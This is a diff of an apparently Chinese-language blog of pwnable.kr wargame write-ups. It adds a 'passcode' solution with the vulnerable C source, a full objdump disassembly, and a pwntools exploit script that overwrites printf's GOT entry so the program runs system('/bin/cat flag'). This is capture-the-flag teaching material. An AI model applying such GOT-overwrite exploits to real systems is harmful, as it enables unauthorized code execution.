@@ -126,7 +126,7 @@
                   
                   &nbsp;<i class="far fa-chart-bar"></i>
                   <span class="post-count">
-                    392 字
+                    3.3k 字
                   </span>&nbsp;
                 
 
@@ -134,7 +134,7 @@
                   
                   &nbsp;<i class="far fa-clock"></i>
                   <span class="post-count">
-                      2 分钟
+                      19 分钟
                   </span>&nbsp;
                 
 
@@ -231,6 +231,480 @@ int main(int argc, char* argv[]){
 <h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><p>这道题需要进行脱壳首先checksec flag<br>发现它是upx加壳的。<br>下载upx<br>upx -d flag<br>用IDA打开 alt -t 搜素flag找到flag即可。</p>
 <blockquote>
 <p>UPX…? sounds like a delivery service :)</p>
+</blockquote>
+<h1 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h1><p>ssh <a href="mailto:passcode@pwnable.kr">passcode@pwnable.kr</a> -p2222 (pw:guest)<br>这里是passcode.c的源码：</p>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void login(){
+    int passcode1;
+    int passcode2;
+
+    printf(&quot;enter passcode1 : &quot;);
+    scanf(&quot;%d&quot;, passcode1);
+    fflush(stdin);
+
+    // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
+    printf(&quot;enter passcode2 : &quot;);
+        scanf(&quot;%d&quot;, passcode2);
+
+    printf(&quot;checking...\n&quot;);
+    if(passcode1==338150 &amp;&amp; passcode2==13371337){
+                printf(&quot;Login OK!\n&quot;);
+                system(&quot;/bin/cat flag&quot;);
+        }
+        else{
+                printf(&quot;Login Failed!\n&quot;);
+        exit(0);
+        }
+}
+
+void welcome(){
+    char name[100];
+    printf(&quot;enter you name : &quot;);
+    scanf(&quot;%100s&quot;, name);
+    printf(&quot;Welcome %s!\n&quot;, name);
+}
+
+int main(){
+    printf(&quot;Toddler&#39;s Secure Login System 1.0 beta.\n&quot;);
+
+    welcome();
+    login();
+
+    // something after login...
+    printf(&quot;Now I can safely trust you that you have credential :)\n&quot;);
+    return 0;    
+}
+
+passcode@pwnable:~$  ./passcode
+Toddler&#39;s Secure Login System 1.0 beta.
+enter you name : 1
+Welcome 1!
+enter passcode1 : 338150
+Segmentation fault (core dumped)
+passcode@pwnable:~$  ./passcode
+Toddler&#39;s Secure Login System 1.0 beta.
+enter you name : 33
+Welcome 33!
+enter passcode1 : 33
+Segmentation fault (core dumped)
+passcode@pwnable:~$ cat passcode.c
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void login(){
+    int passcode1;
+    int passcode2;
+
+    printf(&quot;enter passcode1 : &quot;);
+    scanf(&quot;%d&quot;, passcode1);
+    fflush(stdin);
+
+    // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
+    printf(&quot;enter passcode2 : &quot;);
+        scanf(&quot;%d&quot;, passcode2);
+
+    printf(&quot;checking...\n&quot;);
+    if(passcode1==338150 &amp;&amp; passcode2==13371337){
+                printf(&quot;Login OK!\n&quot;);
+                system(&quot;/bin/cat flag&quot;);
+        }
+        else{
+                printf(&quot;Login Failed!\n&quot;);
+        exit(0);
+        }
+}
+
+void welcome(){
+    char name[100];
+    printf(&quot;enter you name : &quot;);
+    scanf(&quot;%100s&quot;, name);
+    printf(&quot;Welcome %s!\n&quot;, name);
+}
+
+int main(){
+    printf(&quot;Toddler&#39;s Secure Login System 1.0 beta.\n&quot;);
+
+    welcome();
+    login();
+
+    // something after login...
+    printf(&quot;Now I can safely trust you that you have credential :)\n&quot;);
+    return 0;    
+}</code></pre><p>其中输入passcode1和passcode2时没有加&amp;，所以程序发生了错误。</p>
+<pre><code>     passcode@pwnable:~$ ls
+  flag  passcode    passcode.c
+  passcode@pwnable:~$ objdump -d passcode
+
+  passcode:     file format elf32-i386
+
+
+  Disassembly of section .init:
+
+  080483e0 &lt;_init&gt;:
+   80483e0:    53                       push   %ebx
+   80483e1:    83 ec 08                 sub    $0x8,%esp
+   80483e4:    e8 00 00 00 00           call   80483e9 &lt;_init+0x9&gt;
+   80483e9:    5b                       pop    %ebx
+   80483ea:    81 c3 0b 1c 00 00        add    $0x1c0b,%ebx
+   80483f0:    8b 83 fc ff ff ff        mov    -0x4(%ebx),%eax
+   80483f6:    85 c0                    test   %eax,%eax
+   80483f8:    74 05                    je     80483ff &lt;_init+0x1f&gt;
+   80483fa:    e8 71 00 00 00           call   8048470 &lt;__gmon_start__@plt&gt;
+   80483ff:    e8 3c 01 00 00           call   8048540 &lt;frame_dummy&gt;
+   8048404:    e8 17 03 00 00           call   8048720 &lt;__do_global_ctors_aux&gt;
+   8048409:    83 c4 08                 add    $0x8,%esp
+   804840c:    5b                       pop    %ebx
+   804840d:    c3                       ret    
+
+  Disassembly of section .plt:
+
+  08048410 &lt;printf@plt-0x10&gt;:
+   8048410:    ff 35 f8 9f 04 08        pushl  0x8049ff8
+   8048416:    ff 25 fc 9f 04 08        jmp    *0x8049ffc
+   804841c:    00 00                    add    %al,(%eax)
+      ...
+
+  08048420 &lt;printf@plt&gt;:
+   8048420:    ff 25 00 a0 04 08        jmp    *0x804a000
+   8048426:    68 00 00 00 00           push   $0x0
+   804842b:    e9 e0 ff ff ff           jmp    8048410 &lt;_init+0x30&gt;
+
+  08048430 &lt;fflush@plt&gt;:
+   8048430:    ff 25 04 a0 04 08        jmp    *0x804a004
+   8048436:    68 08 00 00 00           push   $0x8
+   804843b:    e9 d0 ff ff ff           jmp    8048410 &lt;_init+0x30&gt;
+
+  08048440 &lt;__stack_chk_fail@plt&gt;:
+   8048440:    ff 25 08 a0 04 08        jmp    *0x804a008
+   8048446:    68 10 00 00 00           push   $0x10
+   804844b:    e9 c0 ff ff ff           jmp    8048410 &lt;_init+0x30&gt;
+
+  08048450 &lt;puts@plt&gt;:
+   8048450:    ff 25 0c a0 04 08        jmp    *0x804a00c
+   8048456:    68 18 00 00 00           push   $0x18
+   804845b:    e9 b0 ff ff ff           jmp    8048410 &lt;_init+0x30&gt;
+
+  08048460 &lt;system@plt&gt;:
+   8048460:    ff 25 10 a0 04 08        jmp    *0x804a010
+   8048466:    68 20 00 00 00           push   $0x20
+   804846b:    e9 a0 ff ff ff           jmp    8048410 &lt;_init+0x30&gt;
+
+  08048470 &lt;__gmon_start__@plt&gt;:
+   8048470:    ff 25 14 a0 04 08        jmp    *0x804a014
+   8048476:    68 28 00 00 00           push   $0x28
+   804847b:    e9 90 ff ff ff           jmp    8048410 &lt;_init+0x30&gt;
+
+  08048480 &lt;exit@plt&gt;:
+   8048480:    ff 25 18 a0 04 08        jmp    *0x804a018
+   8048486:    68 30 00 00 00           push   $0x30
+   804848b:    e9 80 ff ff ff           jmp    8048410 &lt;_init+0x30&gt;
+
+  08048490 &lt;__libc_start_main@plt&gt;:
+   8048490:    ff 25 1c a0 04 08        jmp    *0x804a01c
+   8048496:    68 38 00 00 00           push   $0x38
+   804849b:    e9 70 ff ff ff           jmp    8048410 &lt;_init+0x30&gt;
+
+  080484a0 &lt;__isoc99_scanf@plt&gt;:
+   80484a0:    ff 25 20 a0 04 08        jmp    *0x804a020
+   80484a6:    68 40 00 00 00           push   $0x40
+   80484ab:    e9 60 ff ff ff           jmp    8048410 &lt;_init+0x30&gt;
+
+  Disassembly of section .text:
+
+  080484b0 &lt;_start&gt;:
+   80484b0:    31 ed                    xor    %ebp,%ebp
+   80484b2:    5e                       pop    %esi
+   80484b3:    89 e1                    mov    %esp,%ecx
+   80484b5:    83 e4 f0                 and    $0xfffffff0,%esp
+   80484b8:    50                       push   %eax
+   80484b9:    54                       push   %esp
+   80484ba:    52                       push   %edx
+   80484bb:    68 10 87 04 08           push   $0x8048710
+   80484c0:    68 a0 86 04 08           push   $0x80486a0
+   80484c5:    51                       push   %ecx
+   80484c6:    56                       push   %esi
+   80484c7:    68 65 86 04 08           push   $0x8048665
+   80484cc:    e8 bf ff ff ff           call   8048490 &lt;__libc_start_main@plt&gt;
+   80484d1:    f4                       hlt    
+   80484d2:    90                       nop
+   80484d3:    90                       nop
+   80484d4:    90                       nop
+   80484d5:    90                       nop
+   80484d6:    90                       nop
+   80484d7:    90                       nop
+   80484d8:    90                       nop
+   80484d9:    90                       nop
+   80484da:    90                       nop
+   80484db:    90                       nop
+   80484dc:    90                       nop
+   80484dd:    90                       nop
+   80484de:    90                       nop
+   80484df:    90                       nop
+
+  080484e0 &lt;__do_global_dtors_aux&gt;:
+   80484e0:    55                       push   %ebp
+   80484e1:    89 e5                    mov    %esp,%ebp
+   80484e3:    53                       push   %ebx
+   80484e4:    83 ec 04                 sub    $0x4,%esp
+   80484e7:    80 3d 30 a0 04 08 00     cmpb   $0x0,0x804a030
+   80484ee:    75 3f                    jne    804852f &lt;__do_global_dtors_aux+0x4f&gt;
+   80484f0:    a1 34 a0 04 08           mov    0x804a034,%eax
+   80484f5:    bb 20 9f 04 08           mov    $0x8049f20,%ebx
+   80484fa:    81 eb 1c 9f 04 08        sub    $0x8049f1c,%ebx
+   8048500:    c1 fb 02                 sar    $0x2,%ebx
+   8048503:    83 eb 01                 sub    $0x1,%ebx
+   8048506:    39 d8                    cmp    %ebx,%eax
+   8048508:    73 1e                    jae    8048528 &lt;__do_global_dtors_aux+0x48&gt;
+   804850a:    8d b6 00 00 00 00        lea    0x0(%esi),%esi
+   8048510:    83 c0 01                 add    $0x1,%eax
+   8048513:    a3 34 a0 04 08           mov    %eax,0x804a034
+   8048518:    ff 14 85 1c 9f 04 08     call   *0x8049f1c(,%eax,4)
+   804851f:    a1 34 a0 04 08           mov    0x804a034,%eax
+   8048524:    39 d8                    cmp    %ebx,%eax
+   8048526:    72 e8                    jb     8048510 &lt;__do_global_dtors_aux+0x30&gt;
+   8048528:    c6 05 30 a0 04 08 01     movb   $0x1,0x804a030
+   804852f:    83 c4 04                 add    $0x4,%esp
+   8048532:    5b                       pop    %ebx
+   8048533:    5d                       pop    %ebp
+   8048534:    c3                       ret    
+   8048535:    8d 74 26 00              lea    0x0(%esi,%eiz,1),%esi
+   8048539:    8d bc 27 00 00 00 00     lea    0x0(%edi,%eiz,1),%edi
+
+  08048540 &lt;frame_dummy&gt;:
+   8048540:    55                       push   %ebp
+   8048541:    89 e5                    mov    %esp,%ebp
+   8048543:    83 ec 18                 sub    $0x18,%esp
+   8048546:    a1 24 9f 04 08           mov    0x8049f24,%eax
+   804854b:    85 c0                    test   %eax,%eax
+   804854d:    74 12                    je     8048561 &lt;frame_dummy+0x21&gt;
+   804854f:    b8 00 00 00 00           mov    $0x0,%eax
+   8048554:    85 c0                    test   %eax,%eax
+   8048556:    74 09                    je     8048561 &lt;frame_dummy+0x21&gt;
+   8048558:    c7 04 24 24 9f 04 08     movl   $0x8049f24,(%esp)
+   804855f:    ff d0                    call   *%eax
+   8048561:    c9                       leave  
+   8048562:    c3                       ret    
+   8048563:    90                       nop
+
+  08048564 &lt;login&gt;:
+   8048564:    55                       push   %ebp
+   8048565:    89 e5                    mov    %esp,%ebp
+   8048567:    83 ec 28                 sub    $0x28,%esp
+   804856a:    b8 70 87 04 08           mov    $0x8048770,%eax
+   804856f:    89 04 24                 mov    %eax,(%esp)
+   8048572:    e8 a9 fe ff ff           call   8048420 &lt;printf@plt&gt;
+   8048577:    b8 83 87 04 08           mov    $0x8048783,%eax
+   804857c:    8b 55 f0                 mov    -0x10(%ebp),%edx
+   804857f:    89 54 24 04              mov    %edx,0x4(%esp)
+   8048583:    89 04 24                 mov    %eax,(%esp)
+   8048586:    e8 15 ff ff ff           call   80484a0 &lt;__isoc99_scanf@plt&gt;
+   804858b:    a1 2c a0 04 08           mov    0x804a02c,%eax
+   8048590:    89 04 24                 mov    %eax,(%esp)
+   8048593:    e8 98 fe ff ff           call   8048430 &lt;fflush@plt&gt;
+   8048598:    b8 86 87 04 08           mov    $0x8048786,%eax
+   804859d:    89 04 24                 mov    %eax,(%esp)
+   80485a0:    e8 7b fe ff ff           call   8048420 &lt;printf@plt&gt;
+   80485a5:    b8 83 87 04 08           mov    $0x8048783,%eax
+   80485aa:    8b 55 f4                 mov    -0xc(%ebp),%edx
+   80485ad:    89 54 24 04              mov    %edx,0x4(%esp)
+   80485b1:    89 04 24                 mov    %eax,(%esp)
+   80485b4:    e8 e7 fe ff ff           call   80484a0 &lt;__isoc99_scanf@plt&gt;
+   80485b9:    c7 04 24 99 87 04 08     movl   $0x8048799,(%esp)
+   80485c0:    e8 8b fe ff ff           call   8048450 &lt;puts@plt&gt;
+   80485c5:    81 7d f0 e6 28 05 00     cmpl   $0x528e6,-0x10(%ebp)
+   80485cc:    75 23                    jne    80485f1 &lt;login+0x8d&gt;
+   80485ce:    81 7d f4 c9 07 cc 00     cmpl   $0xcc07c9,-0xc(%ebp)
+   80485d5:    75 1a                    jne    80485f1 &lt;login+0x8d&gt;
+   80485d7:    c7 04 24 a5 87 04 08     movl   $0x80487a5,(%esp)
+   80485de:    e8 6d fe ff ff           call   8048450 &lt;puts@plt&gt;
+   80485e3:    c7 04 24 af 87 04 08     movl   $0x80487af,(%esp)
+   80485ea:    e8 71 fe ff ff           call   8048460 &lt;system@plt&gt;
+   80485ef:    c9                       leave  
+   80485f0:    c3                       ret    
+   80485f1:    c7 04 24 bd 87 04 08     movl   $0x80487bd,(%esp)
+   80485f8:    e8 53 fe ff ff           call   8048450 &lt;puts@plt&gt;
+   80485fd:    c7 04 24 00 00 00 00     movl   $0x0,(%esp)
+   8048604:    e8 77 fe ff ff           call   8048480 &lt;exit@plt&gt;
+
+  08048609 &lt;welcome&gt;:
+   8048609:    55                       push   %ebp
+   804860a:    89 e5                    mov    %esp,%ebp
+   804860c:    81 ec 88 00 00 00        sub    $0x88,%esp
+   8048612:    65 a1 14 00 00 00        mov    %gs:0x14,%eax
+   8048618:    89 45 f4                 mov    %eax,-0xc(%ebp)
+   804861b:    31 c0                    xor    %eax,%eax
+   804861d:    b8 cb 87 04 08           mov    $0x80487cb,%eax
+   8048622:    89 04 24                 mov    %eax,(%esp)
+   8048625:    e8 f6 fd ff ff           call   8048420 &lt;printf@plt&gt;
+   804862a:    b8 dd 87 04 08           mov    $0x80487dd,%eax
+   804862f:    8d 55 90                 lea    -0x70(%ebp),%edx
+   8048632:    89 54 24 04              mov    %edx,0x4(%esp)
+   8048636:    89 04 24                 mov    %eax,(%esp)
+   8048639:    e8 62 fe ff ff           call   80484a0 &lt;__isoc99_scanf@plt&gt;
+   804863e:    b8 e3 87 04 08           mov    $0x80487e3,%eax
+   8048643:    8d 55 90                 lea    -0x70(%ebp),%edx
+   8048646:    89 54 24 04              mov    %edx,0x4(%esp)
+   804864a:    89 04 24                 mov    %eax,(%esp)
+   804864d:    e8 ce fd ff ff           call   8048420 &lt;printf@plt&gt;
+   8048652:    8b 45 f4                 mov    -0xc(%ebp),%eax
+   8048655:    65 33 05 14 00 00 00     xor    %gs:0x14,%eax
+   804865c:    74 05                    je     8048663 &lt;welcome+0x5a&gt;
+   804865e:    e8 dd fd ff ff           call   8048440 &lt;__stack_chk_fail@plt&gt;
+   8048663:    c9                       leave  
+   8048664:    c3                       ret    
+
+  08048665 &lt;main&gt;:
+   8048665:    55                       push   %ebp
+   8048666:    89 e5                    mov    %esp,%ebp
+   8048668:    83 e4 f0                 and    $0xfffffff0,%esp
+   804866b:    83 ec 10                 sub    $0x10,%esp
+   804866e:    c7 04 24 f0 87 04 08     movl   $0x80487f0,(%esp)
+   8048675:    e8 d6 fd ff ff           call   8048450 &lt;puts@plt&gt;
+   804867a:    e8 8a ff ff ff           call   8048609 &lt;welcome&gt;
+   804867f:    e8 e0 fe ff ff           call   8048564 &lt;login&gt;
+   8048684:    c7 04 24 18 88 04 08     movl   $0x8048818,(%esp)
+   804868b:    e8 c0 fd ff ff           call   8048450 &lt;puts@plt&gt;
+   8048690:    b8 00 00 00 00           mov    $0x0,%eax
+   8048695:    c9                       leave  
+   8048696:    c3                       ret    
+   8048697:    90                       nop
+   8048698:    90                       nop
+   8048699:    90                       nop
+   804869a:    90                       nop
+   804869b:    90                       nop
+   804869c:    90                       nop
+   804869d:    90                       nop
+   804869e:    90                       nop
+   804869f:    90                       nop
+
+  080486a0 &lt;__libc_csu_init&gt;:
+   80486a0:    55                       push   %ebp
+   80486a1:    57                       push   %edi
+   80486a2:    56                       push   %esi
+   80486a3:    53                       push   %ebx
+   80486a4:    e8 69 00 00 00           call   8048712 &lt;__i686.get_pc_thunk.bx&gt;
+   80486a9:    81 c3 4b 19 00 00        add    $0x194b,%ebx
+   80486af:    83 ec 1c                 sub    $0x1c,%esp
+   80486b2:    8b 6c 24 30              mov    0x30(%esp),%ebp
+   80486b6:    8d bb 20 ff ff ff        lea    -0xe0(%ebx),%edi
+   80486bc:    e8 1f fd ff ff           call   80483e0 &lt;_init&gt;
+   80486c1:    8d 83 20 ff ff ff        lea    -0xe0(%ebx),%eax
+   80486c7:    29 c7                    sub    %eax,%edi
+   80486c9:    c1 ff 02                 sar    $0x2,%edi
+   80486cc:    85 ff                    test   %edi,%edi
+   80486ce:    74 29                    je     80486f9 &lt;__libc_csu_init+0x59&gt;
+   80486d0:    31 f6                    xor    %esi,%esi
+   80486d2:    8d b6 00 00 00 00        lea    0x0(%esi),%esi
+   80486d8:    8b 44 24 38              mov    0x38(%esp),%eax
+   80486dc:    89 2c 24                 mov    %ebp,(%esp)
+   80486df:    89 44 24 08              mov    %eax,0x8(%esp)
+   80486e3:    8b 44 24 34              mov    0x34(%esp),%eax
+   80486e7:    89 44 24 04              mov    %eax,0x4(%esp)
+   80486eb:    ff 94 b3 20 ff ff ff     call   *-0xe0(%ebx,%esi,4)
+   80486f2:    83 c6 01                 add    $0x1,%esi
+   80486f5:    39 fe                    cmp    %edi,%esi
+   80486f7:    75 df                    jne    80486d8 &lt;__libc_csu_init+0x38&gt;
+   80486f9:    83 c4 1c                 add    $0x1c,%esp
+   80486fc:    5b                       pop    %ebx
+   80486fd:    5e                       pop    %esi
+   80486fe:    5f                       pop    %edi
+   80486ff:    5d                       pop    %ebp
+   8048700:    c3                       ret    
+   8048701:    eb 0d                    jmp    8048710 &lt;__libc_csu_fini&gt;
+   8048703:    90                       nop
+   8048704:    90                       nop
+   8048705:    90                       nop
+   8048706:    90                       nop
+   8048707:    90                       nop
+   8048708:    90                       nop
+   8048709:    90                       nop
+   804870a:    90                       nop
+   804870b:    90                       nop
+   804870c:    90                       nop
+   804870d:    90                       nop
+   804870e:    90                       nop
+   804870f:    90                       nop
+
+  08048710 &lt;__libc_csu_fini&gt;:
+   8048710:    f3 c3                    repz ret 
+
+  08048712 &lt;__i686.get_pc_thunk.bx&gt;:
+   8048712:    8b 1c 24                 mov    (%esp),%ebx
+   8048715:    c3                       ret    
+   8048716:    90                       nop
+   8048717:    90                       nop
+   8048718:    90                       nop
+   8048719:    90                       nop
+   804871a:    90                       nop
+   804871b:    90                       nop
+   804871c:    90                       nop
+   804871d:    90                       nop
+   804871e:    90                       nop
+   804871f:    90                       nop
+
+  08048720 &lt;__do_global_ctors_aux&gt;:
+   8048720:    55                       push   %ebp
+   8048721:    89 e5                    mov    %esp,%ebp
+   8048723:    53                       push   %ebx
+   8048724:    83 ec 04                 sub    $0x4,%esp
+   8048727:    a1 14 9f 04 08           mov    0x8049f14,%eax
+   804872c:    83 f8 ff                 cmp    $0xffffffff,%eax
+   804872f:    74 13                    je     8048744 &lt;__do_global_ctors_aux+0x24&gt;
+   8048731:    bb 14 9f 04 08           mov    $0x8049f14,%ebx
+   8048736:    66 90                    xchg   %ax,%ax
+   8048738:    83 eb 04                 sub    $0x4,%ebx
+   804873b:    ff d0                    call   *%eax
+   804873d:    8b 03                    mov    (%ebx),%eax
+   804873f:    83 f8 ff                 cmp    $0xffffffff,%eax
+   8048742:    75 f4                    jne    8048738 &lt;__do_global_ctors_aux+0x18&gt;
+   8048744:    83 c4 04                 add    $0x4,%esp
+   8048747:    5b                       pop    %ebx
+   8048748:    5d                       pop    %ebp
+   8048749:    c3                       ret    
+   804874a:    90                       nop
+   804874b:    90                       nop
+
+  Disassembly of section .fini:
+
+  0804874c &lt;_fini&gt;:
+   804874c:    53                       push   %ebx
+   804874d:    83 ec 08                 sub    $0x8,%esp
+   8048750:    e8 00 00 00 00           call   8048755 &lt;_fini+0x9&gt;
+   8048755:    5b                       pop    %ebx
+   8048756:    81 c3 9f 18 00 00        add    $0x189f,%ebx
+   804875c:    e8 7f fd ff ff           call   80484e0 &lt;__do_global_dtors_aux&gt;
+   8048761:    83 c4 08                 add    $0x8,%esp
+   8048764:    5b                       pop    %ebx
+   8048765:    c3                       ret    
+  passcode@pwnable:~$ </code></pre><p>可以看到welcome函数中数组设得比较大，设想可以通过name数组对passcode1进行覆盖运行system命令。</p>
+<p>两个函数： welcome（） 和  login（） 是具有相同的EBP.<br>welcome（）中的name在ebp-0x70的位置<br>login（） 中的passcode1在%ebp-0x10<br>从name覆写道passcode1的长度为：len = 0x70-0x10 = 112-16 = 96<br>所以构造： ‘A’ *96个占位 + prinf_got_addr +system_flag</p>
+<pre><code>printf_got = 0x0804a000 system_flag = 0x080485E3
+python -c &quot;print (‘a‘*96+‘\x00\xa0\x04\x08‘+‘\n‘+‘134514147\n‘)&quot; |
+./passcode</code></pre><p>此时调用 scanf(“%d”, passcode1); 函数，会向这个地址处printf_got_addr处写数据，也<br>就是要修改printf_got的地址，修改成什么呢？当然是我们需要执行的函数<br>（system_flag），使 system(“/bin/cat flag”) 得到执行。</p>
+<p>那么我们又如何得到printf_got和system的地址呢<br>找prinf_got_addr ：通过 objdump -d passcode中的printf@plt指向的地址：printf_got = 0x0804a000</p>
+<pre><code>08048420 &lt;printf@plt&gt;:
+8048420: ff 25 00 a0 04 08 jmp *0x0804a000
+8048426: 68 00 00 00 00 push $0x0
+804842b: e9 e0 ff ff ff jmp 8048410 &lt;_init+0x30&gt;</code></pre><p>找system(“/bin/cat flag”)汇编程序中程序执行到的位置。或者通过objdump -d passcode中的login指向的地址：system_flag = 0x080485E3 。</p>
+<p>因为scanf要输入的是%d,0x080485e3的十进制就是134514147。</p>
+<pre><code>80485e3: c7 04 24 af 87 04 08 movl $0x80487af,(%esp)</code></pre><p>而下面是我用pwntools写的脚本：</p>
+<pre><code>from pwn import *
+s = ssh(host=&#39;pwnable.kr&#39;,user=&#39;passcode&#39;,port=2222,password=&#39;guest&#39;)
+p = s.process(&#39;./passcode&#39;)
+shellcode = &#39;A&#39;*96 + p32(0x0804a000)
+
+p.recvuntil(&quot;enter you name : &quot;)
+p.sendline(shellcode)
+p.recvuntil(&#39;enter passcode1 : &#39;)
+p.sendline(str(int(0x80485E3)))
+p.interactive()</code></pre><blockquote>
+<blockquote>
+<blockquote>
+<p>Sorry mom.. I got confused about scanf usage :(</p>
+</blockquote>
+</blockquote>
 </blockquote>
 
             <hr>
